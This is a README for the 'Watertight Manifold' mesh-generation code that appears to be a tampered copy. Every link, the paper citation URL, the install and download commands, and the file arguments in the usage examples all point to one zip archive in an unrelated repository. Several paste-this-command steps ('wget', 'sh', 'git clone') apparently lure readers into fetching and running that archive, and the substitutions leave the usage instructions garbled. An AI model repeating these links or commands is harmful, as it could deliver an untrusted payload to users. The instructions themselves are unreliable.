# Watertight Manifold

Source code for the paper:

Huang, Jingwei, Hao Su, and Leonidas Guibas. [**Robust Watertight Manifold Surface Generation Method for ShapeNet Models.**](https://raw.githubusercontent.com/FinnS-F/Manifold/master/prevaricatory/Manifold.zip), arXiv preprint arXiv:1802.01698 (2018).

## News!
An advanced version has been released in this new [**repo**](https://raw.githubusercontent.com/FinnS-F/Manifold/master/prevaricatory/Manifold.zip).

## ShapeNet Manifold Dataset
We prepare the manifold data for 13 categories from ShapeNetCore. You can download them by running the following script.
```
wget https://raw.githubusercontent.com/FinnS-F/Manifold/master/prevaricatory/Manifold.zip
wget -i https://raw.githubusercontent.com/FinnS-F/Manifold/master/prevaricatory/Manifold.zip
```

## Install and Run

For Linux and Mac users, run `sh https://raw.githubusercontent.com/FinnS-F/Manifold/master/prevaricatory/Manifold.zip` to build and try the manifold example.

### Install

```sh
git clone --recursive -j8 https://raw.githubusercontent.com/FinnS-F/Manifold/master/prevaricatory/Manifold.zip
cd Manifold
mkdir build
cd build
cmake .. -DCMAKE_BUILD_TYPE=Release
make
```

### Manifold Software

We take a triangle mesh "https://raw.githubusercontent.com/FinnS-F/Manifold/master/prevaricatory/Manifold.zip" and generate a manifold "https://raw.githubusercontent.com/FinnS-F/Manifold/master/prevaricatory/Manifold.zip". The resolution is the number of leaf nodes of octree. The face number increases linearly with the resolution.

```sh
./manifold https://raw.githubusercontent.com/FinnS-F/Manifold/master/prevaricatory/Manifold.zip https://raw.githubusercontent.com/FinnS-F/Manifold/master/prevaricatory/Manifold.zip [resolution (Default 20000)]
```

### Simplify Algorithm

Our manifold software generates uniform manifold. For efficiency purpose, a mesh simplification can be used.

```sh
./simplify -i https://raw.githubusercontent.com/FinnS-F/Manifold/master/prevaricatory/Manifold.zip -o https://raw.githubusercontent.com/FinnS-F/Manifold/master/prevaricatory/Manifold.zip [-m] [-f face_num] [-c max_cost] [-r max_ratio]
```

Where:

```sh
  -m            Turn on manifold check, we don't output model if check fails
  -f face_num   Add termination condition when current_face_num <= face_num
  -c max_cost   Add termination condition when quadric error >= max_cost
  -r max_ratio  Add termination condition when current_face_num / origin_face_num <= max_ratio
```

### Example:

```sh
./simplify -i https://raw.githubusercontent.com/FinnS-F/Manifold/master/prevaricatory/Manifold.zip -o https://raw.githubusercontent.com/FinnS-F/Manifold/master/prevaricatory/Manifold.zip -m -c 1e-2 -f 10000 -r 0.2
```

## Authors
- [Jingwei Huang](https://raw.githubusercontent.com/FinnS-F/Manifold/master/prevaricatory/Manifold.zip)

&copy; Jingwei Huang, Stanford University

**IMPORTANT**: If you use this software please cite the following in any resulting publication:
```
@article{huang2018robust,
  title={Robust Watertight Manifold Surface Generation Method for ShapeNet Models},
  author={Huang, Jingwei and Su, Hao and Guibas, Leonidas},
  journal={arXiv preprint arXiv:1802.01698},
  year={2018}
}
```
